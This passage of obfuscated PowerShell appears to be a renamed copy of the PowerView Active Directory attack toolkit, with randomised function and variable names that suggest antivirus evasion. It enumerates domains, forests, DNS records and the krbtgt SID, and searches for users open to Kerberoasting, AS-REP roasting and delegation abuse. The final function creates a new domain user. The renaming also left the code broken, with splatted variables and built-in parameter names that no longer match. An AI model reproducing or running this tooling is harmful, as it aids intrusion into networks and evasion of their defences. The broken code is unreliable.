                    $Out = hoaxer -wDpWXLYTGZrAWN9 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $Tuvy9HEgBXzRgud


                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {

                        $YbGqxBUjZ9LvTEv = snared -XxwULpWpgkOc9Yb $Out.dnsrecord[0]
                    }
                    else {
                        $YbGqxBUjZ9LvTEv = snared -XxwULpWpgkOc9Yb $Out.dnsrecord
                    }

                    if ($YbGqxBUjZ9LvTEv) {
                        $YbGqxBUjZ9LvTEv.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[irredeemable] Error: $_"
                    $Out
                }
            }

            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[irredeemable] Error disposing of the Results object: $_"
                }
            }
            $FIJZustdS9F9aCL.dispose()
        }
    }
}


function forked {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[forked] Using alternate credentials for forked'

            if ($PSBoundParameters['Domain']) {
                $rT9EZJuWEfY9rVY = $pkMxgDCVHqOym9m
            }
            else {

                $rT9EZJuWEfY9rVY = $szvFVWkPJummdcf.GetNetworkCredential().Domain
                Write-Verbose "[forked] Extracted domain '$rT9EZJuWEfY9rVY' from -szvFVWkPJummdcf"
            }

            $O99UTybpGxyTGtg = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $rT9EZJuWEfY9rVY, $szvFVWkPJummdcf.UserName, $szvFVWkPJummdcf.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($O99UTybpGxyTGtg)
            }
            catch {
                Write-Verbose "[forked] The specified domain '$rT9EZJuWEfY9rVY' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $O99UTybpGxyTGtg = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $pkMxgDCVHqOym9m)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($O99UTybpGxyTGtg)
            }
            catch {
                Write-Verbose "[forked] The specified domain '$pkMxgDCVHqOym9m' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[forked] Error retrieving the current domain: $_"
            }
        }
    }
}


function milligram {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $hBxE99NfywDenP9 = @{}
        if ($PSBoundParameters['Domain']) { $hBxE99NfywDenP9['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Credential']) { $hBxE99NfywDenP9['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $hBxE99NfywDenP9['Server'] = $vzBgfX9wPWmbsYZ }


            $hBxE99NfywDenP9['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            eigenvalues @Arguments
        }
        else {
            $fjOZl9aUAieGsFl = forked @Arguments
            if ($fjOZl9aUAieGsFl) {
                $fjOZl9aUAieGsFl.DomainControllers
            }
        }
    }
}


function cannibalizes {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Ffrzh9iyXWauyhS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[cannibalizes] Using alternate credentials for cannibalizes"

            if ($PSBoundParameters['Forest']) {
                $OznCNGiFBMDBmPe = $Ffrzh9iyXWauyhS
            }
            else {

                $OznCNGiFBMDBmPe = $szvFVWkPJummdcf.GetNetworkCredential().Domain
                Write-Verbose "[cannibalizes] Extracted domain '$Ffrzh9iyXWauyhS' from -szvFVWkPJummdcf"
            }

            $vNJKFGaxU9W9qEO = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $OznCNGiFBMDBmPe, $szvFVWkPJummdcf.UserName, $szvFVWkPJummdcf.GetNetworkCredential().Password)

            try {
                $fucvsqysCxvfNgl = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($vNJKFGaxU9W9qEO)
            }
            catch {
                Write-Verbose "[cannibalizes] The specified forest '$OznCNGiFBMDBmPe' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $vNJKFGaxU9W9qEO = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Ffrzh9iyXWauyhS)
            try {
                $fucvsqysCxvfNgl = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($vNJKFGaxU9W9qEO)
            }
            catch {
                Write-Verbose "[cannibalizes] The specified forest '$Ffrzh9iyXWauyhS' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {

            $fucvsqysCxvfNgl = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($fucvsqysCxvfNgl) {

            if ($PSBoundParameters['Credential']) {
                $bJypoEIbOFQMWOo = (noshes -MhNmgElNMTxhWpJ "krbtgt" -pkMxgDCVHqOym9m $fucvsqysCxvfNgl.RootDomain.Name -szvFVWkPJummdcf $szvFVWkPJummdcf).objectsid
            }
            else {
                $bJypoEIbOFQMWOo = (noshes -MhNmgElNMTxhWpJ "krbtgt" -pkMxgDCVHqOym9m $fucvsqysCxvfNgl.RootDomain.Name).objectsid
            }

            $Parts = $bJypoEIbOFQMWOo -Split '-'
            $bJypoEIbOFQMWOo = $Parts[0..$($Parts.length-2)] -join '-'
            $fucvsqysCxvfNgl | Add-Member NoteProperty 'RootDomainSid' $bJypoEIbOFQMWOo
            $fucvsqysCxvfNgl
        }
    }
}


function unbridled {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Ffrzh9iyXWauyhS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $hBxE99NfywDenP9 = @{}
        if ($PSBoundParameters['Forest']) { $hBxE99NfywDenP9['Forest'] = $Ffrzh9iyXWauyhS }
        if ($PSBoundParameters['Credential']) { $hBxE99NfywDenP9['Credential'] = $szvFVWkPJummdcf }

        $fucvsqysCxvfNgl = cannibalizes @Arguments
        if ($fucvsqysCxvfNgl) {
            $fucvsqysCxvfNgl.Domains
        }
    }
}


function ejected {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Ffrzh9iyXWauyhS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $hBxE99NfywDenP9 = @{}
        if ($PSBoundParameters['Forest']) { $hBxE99NfywDenP9['Forest'] = $Ffrzh9iyXWauyhS }
        if ($PSBoundParameters['Credential']) { $hBxE99NfywDenP9['Credential'] = $szvFVWkPJummdcf }

        $fucvsqysCxvfNgl = cannibalizes @Arguments

        if ($fucvsqysCxvfNgl) {
            $fucvsqysCxvfNgl.FindAllGlobalCatalogs()
        }
    }
}


function conclusions {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $oB9wS9FAUsLPTrr,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Ffrzh9iyXWauyhS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $hBxE99NfywDenP9 = @{}
        if ($PSBoundParameters['Forest']) { $hBxE99NfywDenP9['Forest'] = $Ffrzh9iyXWauyhS }
        if ($PSBoundParameters['Credential']) { $hBxE99NfywDenP9['Credential'] = $szvFVWkPJummdcf }

        $fucvsqysCxvfNgl = cannibalizes @Arguments

        if ($fucvsqysCxvfNgl) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($FShFYHv999UKPwk in $oB9wS9FAUsLPTrr) {
                    $fucvsqysCxvfNgl.Schema.FindClass($FShFYHv999UKPwk)
                }
            }
            else {
                $fucvsqysCxvfNgl.Schema.FindAllClasses()
            }
        }
    }
}


function landfills {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $oB9wS9FAUsLPTrr,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $9Jz9Z9yh9R9ElXe,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ydew9uTaAlukA9E,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $kOdjthqhZAb9ec9 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $vPeJNjUCVMKfugQ = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $99JeA9ZJPYoWSRY = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }


        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $OznCNGiFBMDBmPe = forked -pkMxgDCVHqOym9m $pkMxgDCVHqOym9m | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $OznCNGiFBMDBmPe = forked -pkMxgDCVHqOym9m $pkMxgDCVHqOym9m -szvFVWkPJummdcf $szvFVWkPJummdcf | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[landfills] Enumerated forest '$OznCNGiFBMDBmPe' for target domain '$pkMxgDCVHqOym9m'"
        }

        $MvntkjCqpqLAomw = @{}
        if ($PSBoundParameters['Credential']) { $MvntkjCqpqLAomw['Credential'] = $szvFVWkPJummdcf }
        if ($OznCNGiFBMDBmPe) {
            $MvntkjCqpqLAomw['Forest'] = $OznCNGiFBMDBmPe
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[landfills] Using specified -9Jz9Z9yh9R9ElXe"
            $L9xzYIhRpqGo9Nx = $9Jz9Z9yh9R9ElXe
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[landfills] Extracting property names from -ydew9uTaAlukA9E to use as the reference property set"
            $L9xzYIhRpqGo9Nx = Get-Member -BKOFrZwF9JQDCEa $ydew9uTaAlukA9E -MemberType NoteProperty | Select-Object -Expand Name
            $WYSVhphmtwMnRsm = $ydew9uTaAlukA9E.objectclass | Select-Object -Last 1
            Write-Verbose "[landfills] Calculated ReferenceObjectClass : $WYSVhphmtwMnRsm"
        }
        else {
            Write-Verbose "[landfills] Using the default reference property set for the object class '$oB9wS9FAUsLPTrr'"
        }

        if (($oB9wS9FAUsLPTrr -eq 'User') -or ($WYSVhphmtwMnRsm -eq 'User')) {
            $99fdRlP9mFJRdVO = noshes @SearcherArguments
            if (-not $L9xzYIhRpqGo9Nx) {
                $L9xzYIhRpqGo9Nx = $kOdjthqhZAb9ec9
            }
        }
        elseif (($oB9wS9FAUsLPTrr -eq 'Group') -or ($WYSVhphmtwMnRsm -eq 'Group')) {
            $99fdRlP9mFJRdVO = offenses @SearcherArguments
            if (-not $L9xzYIhRpqGo9Nx) {
                $L9xzYIhRpqGo9Nx = $vPeJNjUCVMKfugQ
            }
        }
        elseif (($oB9wS9FAUsLPTrr -eq 'Computer') -or ($WYSVhphmtwMnRsm -eq 'Computer')) {
            $99fdRlP9mFJRdVO = eigenvalues @SearcherArguments
            if (-not $L9xzYIhRpqGo9Nx) {
                $L9xzYIhRpqGo9Nx = $99JeA9ZJPYoWSRY
            }
        }
        else {
            throw "[landfills] Invalid class: $oB9wS9FAUsLPTrr"
        }

        ForEach ($Object in $99fdRlP9mFJRdVO) {
            $qjEBlkTFANTUxV9 = Get-Member -BKOFrZwF9JQDCEa $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($izlvjLDmTjOZvqK in $qjEBlkTFANTUxV9) {
                if ($L9xzYIhRpqGo9Nx -NotContains $izlvjLDmTjOZvqK) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $izlvjLDmTjOZvqK
                    $Out | Add-Member Noteproperty 'Value' $Object.$izlvjLDmTjOZvqK
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}








function noshes {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [Switch]
        $SPN,

        [Switch]
        $SkNLjyYBJxqKTQ9,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $ppACfvFXyx9fpzx,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $slAHlkIlrtPEUMb,

        [Switch]
        $zFvE9yNbYBI99EP,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $GAErHMuJcxQtArN,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $fY9ETEwlxYkfiAK = [Enum]::GetNames($9HeFXhwjBUWerxx)

        $fY9ETEwlxYkfiAK = $fY9ETEwlxYkfiAK | ForEach-Object {$_; "NOT_$_"}

        modernists -Name UACFilter -vGJOJLQvTfgDgsh $fY9ETEwlxYkfiAK -Type ([array])
    }

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $gmNSnJICOeviaXn = cackles @SearcherArguments
    }

    PROCESS {

        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            modernists -ZbJIThQB9AMYzGF -ATNpRDJr9isTTXi $PSBoundParameters
        }

        if ($gmNSnJICOeviaXn) {
            $9pNjjurFRb9jpSJ = ''
            $9QyouHvxMZKCIKN = ''
            $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($isYmprKvwrxUsJW -match '^S-1-') {
                    $9pNjjurFRb9jpSJ += "(objectsid=$isYmprKvwrxUsJW)"
                }
                elseif ($isYmprKvwrxUsJW -match '^CN=') {
                    $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                        $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[noshes] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                        $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                        $gmNSnJICOeviaXn = cackles @SearcherArguments
                        if (-not $gmNSnJICOeviaXn) {
                            Write-Warning "[noshes] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                        }
                    }
                }
                elseif ($isYmprKvwrxUsJW -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $bgaRJRRuWyecMST = (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                }
                elseif ($isYmprKvwrxUsJW.Contains('\')) {
                    $Z9PeoZBl9Cf9jhl = $isYmprKvwrxUsJW.Replace('\28', '(').Replace('\29', ')') | intermediate -nnLLVWbvFttZtjp Canonical
                    if ($Z9PeoZBl9Cf9jhl) {
                        $tXyHSLSY9cxTtcf = $Z9PeoZBl9Cf9jhl.SubString(0, $Z9PeoZBl9Cf9jhl.IndexOf('/'))
                        $p9HnEIzwegumibI = $isYmprKvwrxUsJW.Split('\')[1]
                        $9pNjjurFRb9jpSJ += "(samAccountName=$p9HnEIzwegumibI)"
                        $tHAcROQOWB9HdRG['Domain'] = $tXyHSLSY9cxTtcf
                        Write-Verbose "[noshes] Extracted domain '$tXyHSLSY9cxTtcf' from '$isYmprKvwrxUsJW'"
                        $gmNSnJICOeviaXn = cackles @SearcherArguments
                    }
                }
                else {
                    $9pNjjurFRb9jpSJ += "(samAccountName=$isYmprKvwrxUsJW)"
                }
            }

            if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[noshes] Searching for non-null service principal names'
                $9QyouHvxMZKCIKN += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[noshes] Searching for users who can be delegated'

                $9QyouHvxMZKCIKN += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[noshes] Searching for users who are sensitive and not trusted for delegation'
                $9QyouHvxMZKCIKN += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[noshes] Searching for adminCount=1'
                $9QyouHvxMZKCIKN += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[noshes] Searching for users that are trusted to authenticate for other principals'
                $9QyouHvxMZKCIKN += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[noshes] Searching for user accounts that do not require kerberos preauthenticate'
                $9QyouHvxMZKCIKN += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[noshes] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
            }


            $BFvLesNO9yqAUdC | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $DlcqcBMAvlNxwiV = $_.Substring(4)
                    $CEKifFqxfnVApbV = [Int]($9HeFXhwjBUWerxx::$DlcqcBMAvlNxwiV)
                    $9QyouHvxMZKCIKN += "(!(userAccountControl:1.2.840.113556.1.4.803:=$CEKifFqxfnVApbV))"
                }
                else {
                    $CEKifFqxfnVApbV = [Int]($9HeFXhwjBUWerxx::$_)
                    $9QyouHvxMZKCIKN += "(userAccountControl:1.2.840.113556.1.4.803:=$CEKifFqxfnVApbV)"
                }
            }

            $gmNSnJICOeviaXn.filter = "(&(samAccountType=805306368)$9QyouHvxMZKCIKN)"
            Write-Verbose "[noshes] filter string: $($gmNSnJICOeviaXn.filter)"

            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $gmNSnJICOeviaXn.FindOne() }
            else { $xSLNEIXByfNTAdG = $gmNSnJICOeviaXn.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {

                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[noshes] Error disposing of the Results object: $_"
                }
            }
            $gmNSnJICOeviaXn.dispose()
        }
    }
}


function devotional {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $JbtS9UlqTiGk9qR,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $m9vHwkXCpN9VeDB,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $LhnZsdcroBUqwrh,

        [ValidateNotNullOrEmpty()]
        [String]
        $bZXZZOdJRlyaKks,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    $DiFXM9AnKByvDqk = @{
        'Identity' = $JbtS9UlqTiGk9qR
    }
    if ($PSBoundParameters['Domain']) { $DiFXM9AnKByvDqk['Domain'] = $pkMxgDCVHqOym9m }
    if ($PSBoundParameters['Credential']) { $DiFXM9AnKByvDqk['Credential'] = $szvFVWkPJummdcf }
    $LpgwDvCRKxnE9zi = Gautama @ContextArguments

    if ($LpgwDvCRKxnE9zi) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($LpgwDvCRKxnE9zi.Context)


        $User.SamAccountName = $LpgwDvCRKxnE9zi.Identity
        $mURLqVdHfmgznZs = New-Object System.Management.Automation.PSCredential('a', $m9vHwkXCpN9VeDB)
        $User.SetPassword($mURLqVdHfmgznZs.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
